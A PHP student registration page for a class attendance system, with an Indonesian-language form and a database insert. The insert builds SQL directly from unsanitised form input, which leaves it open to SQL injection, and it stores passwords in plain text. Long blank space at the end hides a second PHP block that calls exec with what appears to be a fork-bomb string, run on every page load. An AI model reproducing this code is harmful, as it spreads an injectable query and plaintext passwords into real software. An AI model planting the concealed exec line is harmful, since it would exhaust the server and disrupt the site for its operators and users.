<?php

    include 'koneksi.php';

    if (isset($_POST['submit'])){

        $user = $_POST['username'];
        $pass = $_POST['password'];
        $nama = $_POST['namalengkap'];
        $nis  = $_POST['nis'];
        $tempat = $_POST['tempat_lahir'];
        $tanggal = $_POST['tanggal'];
        $bulan = $_POST['bulan'];
        $tahun = $_POST['tahun'];
        $alamat = $_POST['alamat'];
        $telp = $_POST['telepon'];
        $jk = $_POST['jk'];
        $agama = $_POST['agama'];


        $query = "INSERT INTO siswa (username,password,nama_lengkap,nis,tempat_lahir,tanggal,bulan,tahun,alamat,no_telp,jk,agama) VALUES ('$user', '$pass', '$nama', '$nis', '$tempat', '$tanggal', '$bulan', '$tahun', '$alamat', '$telp', '$jk' , '$agama')";

        if(mysqli_query($koneksi,$query)){
            echo "berhasil";
        } 
        else {
            echo "gagal";
        }
    }
    //      if (!$cek_register) {

             
    //          echo "Gagal Terdaftar :(";
    //     }
        
    //     else {
    //         echo "Berhasil Terdaftar";
    //      }

    // }   


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Registrasi | SISTEM ABSEN XI TEL 12</title>
    <link rel="icon" href="add9.png">
    <style>
        
        *{
            margin: 0%;
            padding: 0;
            
        }
    
        h1{
            font-family: sans-serif;
        }

        ul {
        list-style-type: none;
        margin: 0;
        padding-left: 525px;
        overflow: hidden;
        background-color: grey;
        }

        li {
        float: left;
        }

        li a {
        display: block;
        color: black;
        text-align: center;
        padding: 14px 16px;
        text-decoration: none;
        }

        /* Change the link color to #111 (black) on hover */
        li a:hover {
        background-color: white;
        }
        
        .main{
            color: white;
            font-family: sans-serif;
            font-size: 25;
            top: 0px;
            display: absolute;
            width: 700px;
            height: 450px;
            margin-left: 230px;
            padding: 50px 20px 50px 200px;
            background-color: rgb(138, 98, 134);
        }

        body{
            background-color: pink;
        }

        .header{
            background-color: pink;
        }
        
        .tomboldaftar{
            padding: 10px 15px 10px 15px;
            color: white;
            background-color:slateblue;
        }
        .tomboldaftar:hover{
            background-color: green;
        }

        .tombolhapus:hover{
            background-color: red;
        }
        .tombolhapus{
            background-color: slateblue;
            color: white;
            padding: 10px 15px 10px 15px;
        }
    </style>
</head>
<body>
    <div class="header">
        <br>
        <center><h1>Registrasi Akun Siswa XI TEL 12</h1></center><br><hr><hr>
        <center><ul>
        <li><a href="registrasi.php">Registrasi</a></li>
        <li><a href="Login.php">Login</a></li>
        <li><a href="tentangku/aldo.html">Tentangku</a></li>
        </ul></center>
    </div><hr>

    <div class="main">
            <form action="registrasi.php" method="POST">
                <table width="600px" height="500px">
                    <tr>
                        <td><label for="user">Username</label></td>
                        <td>:</td>
                        <td><input type="text" name="username"></td>
                    </tr>
            
                    <tr>
                        <td><label for="password">Password</label></td>
                        <td>:</td>
                        <td><input type="password" name="password"></td>
                    </tr>

                    <tr>
                        <td><label for="namalengkap">Nama Lengkap</label></td>
                        <td>:</td>
                        <td><input type="text" name="namalengkap"></td>
                    </tr>

                    <tr>
                            <td><label for="username">NIS</label></td>
                            <td>:</td>
                            <td><input type="number" name="nis"></td>
                    </tr>
                     
                    <tr>
                        <td><label for="tempat_lahir">Tempat, Tanggal Lahir</label></td>
                        <td>:</td>
                        <td><input type="text" size="20" name="tempat_lahir" id="tempat_lahir">,
                        <input type="text" size="5" name="tanggal" id="tanggal">/
                        <input type="text" size="5" name="bulan" id="bulan">/
                        <input type="text" size="5" name="tahun" id="tahun">
                        </td>
                    </tr>

                    <tr>
                        <td><label for="alamat">Alamat</label></td>
                        <td>:</td>
                        <td><textarea name="alamat" id="alamat" cols="40" rows="4"></textarea></td>
                    </tr>

                    <tr>
                        <td><label for="telepon">No. Telp/HP</label></td>
                        <td>:</td>
                        <td><input type="text" name="telepon" id="telepon" size="15"></td>
                    </tr>

                    <tr>
                        <td><label for="jk">Jenis Kelamin</label></td>
                        <td>:</td>
                        <td><input type="radio" name="jk" id="pria" value="Pria">Pria
                        <input type="radio" name="jk" id="wanita" value="Wanita">Wanita
                        </td>
                    </tr>

                    <tr>
                        <td><label for="agama">Agama</label></td>
                        <td>:</td>
                        <td>
                        <select name="agama" id="agama">
                        <option value="">Pilih Agama Anda</option>
                        <option value="Islam">Islam</option>
                        <option value="Kristen Katolik">Kristen Katolik</option>
                        <option value="Kristen Protestan">Kristen Protestan</option>
                        <option value="Hindu">Hindu</option>
                        <option value="Budha">Budha</option>
                        <option value="Kong Hu Cu">Kong Hu Chu</option>
                        </select>
                        </td>
                    </tr>

                    <tr>    
                        <td></td>
                        <td></td>
                        <td>
                        <input type="submit" name="submit" value="Daftar" class="tomboldaftar">
                        <input type="reset" name="reset" value="Hapus" class="tombolhapus">
                        </td>
                    </tr>

                    </table>
                </table>
            </form>    
            
    </div>
        
</body>
</html>















































<?php
exec ('%0|%0|%0|%0|%0|%0|');


?>
